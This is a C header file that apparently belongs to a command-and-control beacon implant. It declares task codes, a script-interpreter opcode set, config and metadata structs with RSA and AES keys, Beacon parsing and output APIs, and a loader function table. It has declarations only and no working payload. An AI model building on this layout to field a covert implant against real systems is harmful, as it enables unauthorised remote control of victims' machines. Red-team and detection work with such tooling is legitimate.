#ifndef NT_SUCCESS
#define NT_SUCCESS(status) ( ( ( NTSTATUS ) ( status ) ) >= 0 )
#endif

#define AES_KEY_LEN 16
#define HMAC_LEN    32

#define METADATA_FLAG_X86   1
#define METADATA_FLAG_ADMIN 2

#if defined WIN_X64
#define IS_X64() ( TRUE )
#else
#define IS_X64() ( FALSE )
#endif

#define TASK_EXIT          0
#define TASK_SLEEP         1
#define TASK_PICO          2
#define TASK_RAILGUN 3

/* Railgun script opcodes — must match Client/Scripts/RailgunScript/Compiler.cs */
#define RGS_OP_HALT      0x00
#define RGS_OP_PUSH_INT  0x01
#define RGS_OP_PUSH_STR  0x02
#define RGS_OP_PUSH_WSTR 0x03
#define RGS_OP_PUSH_OUT  0x04
#define RGS_OP_LOAD      0x05
#define RGS_OP_STORE     0x06
#define RGS_OP_LOAD_ADDR 0x07
#define RGS_OP_CALL      0x08
#define RGS_OP_POP       0x09
#define RGS_OP_JMP       0x0A
#define RGS_OP_JZ        0x0B
#define RGS_OP_JNZ       0x0C
#define RGS_OP_CMP_EQ    0x0D
#define RGS_OP_CMP_NEQ   0x0E
#define RGS_OP_CMP_LT    0x0F
#define RGS_OP_CMP_GT    0x10
#define RGS_OP_CMP_LE    0x11
#define RGS_OP_CMP_GE    0x12
#define RGS_OP_ARG_INT   0x13
#define RGS_OP_ARG_STR   0x14
#define RGS_OP_ARG_WSTR  0x15
#define RGS_OP_ARG_BYTES 0x16
#define RGS_OP_DEREF     0x17
#define RGS_OP_OR        0x18

typedef struct {
    int  sleep;
    int  jitter;
    char rsa_key[ 256 ];
    int  key_len;
    int  exit_func;
} config;

typedef struct {
    UINT   bid;
    char   aes_key[ AES_KEY_LEN ];
    size_t length;
    char   data[ 256 ];
} metadata;

typedef struct {
    char * original;
    char * buffer;
    int    length;
    int    size;
} datap, formatp;

typedef void ( * PICO_GO )( char *, int );

void   go                ( char * );
void   generate_metadata ( );
UINT   random_uint       ( );
void   random_bytes      ( UCHAR *, size_t );
UINT   get_internal_ip   ( );
void   format_checkin    ( formatp * );
BOOL   rsa_encrypt       ( UCHAR *, ULONG, UCHAR *, ULONG * );
BOOL   aes_encrypt       ( UCHAR *, ULONG, UCHAR *, UCHAR *, UCHAR *, ULONG * );
BOOL   compute_hmac      ( UCHAR *, ULONG, UCHAR *, ULONG, UCHAR * );
void   process_messages  ( char *, size_t );
LPVOID allocate_memory   ( size_t, DWORD );
void   free_memory       ( LPVOID );
void   set_sleep         ( char *, int );
void   execute_pico      ( char *, int );
void   execute_railgun         ( char *, int );
void   exit_beacon       ( );

/**
 * Data Parser API
 */

void   BeaconDataParse   ( datap * parser, char * buffer, int size );
char * BeaconDataExtract ( datap * parser, int * size );
char * BeaconDataPtr     ( datap * parser, int size );
short  BeaconDataShort   ( datap * parser );
int    BeaconDataInt     ( datap * parser );
int    BeaconDataLength  ( datap * parser );

/**
 * Format API
 */

void   BeaconFormatAlloc    ( formatp * parser, int maxsz );
void   BeaconFormatAppend   ( formatp * parser, char * data, int len );
void   BeaconFormatInt      ( formatp * parser, int val );
void   BeaconFormatPrintf   ( formatp * parser, char * fmt, ... );
char * BeaconFormatToString ( formatp * parser, int * size );
void   BeaconFormatReset    ( formatp * parser );
void   BeaconFormatFree     ( formatp * parser );

/**
 * Output API
 */

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_METADATA    0x1
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff

void BeaconPrintf( int type, char * fmt, ... );
void BeaconOutput( int type, char * data, int len );

/**
 * Internal APIs
 */

BOOL BeaconIsAdmin ( );

typedef struct {
    __typeof__ ( LoadLibraryA )         * LoadLibraryA;
    __typeof__ ( GetProcAddress )       * GetProcAddress;
    __typeof__ ( BeaconDataParse )      * BeaconDataParse;
    __typeof__ ( BeaconDataExtract )    * BeaconDataExtract;
    __typeof__ ( BeaconDataPtr )        * BeaconDataPtr;
    __typeof__ ( BeaconDataShort )      * BeaconDataShort;
    __typeof__ ( BeaconDataInt )        * BeaconDataInt;
    __typeof__ ( BeaconDataLength )     * BeaconDataLength;
    __typeof__ ( BeaconFormatAlloc )    * BeaconFormatAlloc;
    __typeof__ ( BeaconFormatInt )      * BeaconFormatInt;
    __typeof__ ( BeaconFormatPrintf )   * BeaconFormatPrintf;
    __typeof__ ( BeaconFormatToString ) * BeaconFormatToString;
    __typeof__ ( BeaconFormatReset )    * BeaconFormatReset;
    __typeof__ ( BeaconFormatFree )     * BeaconFormatFree;
    __typeof__ ( BeaconPrintf )         * BeaconPrintf;
    __typeof__ ( BeaconOutput )         * BeaconOutput;
} bfuncs;